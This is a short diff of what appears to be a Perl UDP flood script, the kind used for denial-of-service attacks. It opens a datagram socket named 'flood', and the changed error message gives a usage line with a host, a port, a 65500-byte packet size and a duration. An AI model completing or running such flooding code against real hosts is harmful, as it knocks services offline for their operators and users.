@@ -11,7 +11,7 @@ my ($ip,$port,$size,$time) = @ARGV;
 
 my ($iaddr,$endtime,$psize,$pport);
 
-$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
+$iaddr = inet_aton("$ip") or die "perl home.pl {host} {port} 65500 {duration}\n";
 $endtime = time() + ($time ? $time : 100);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
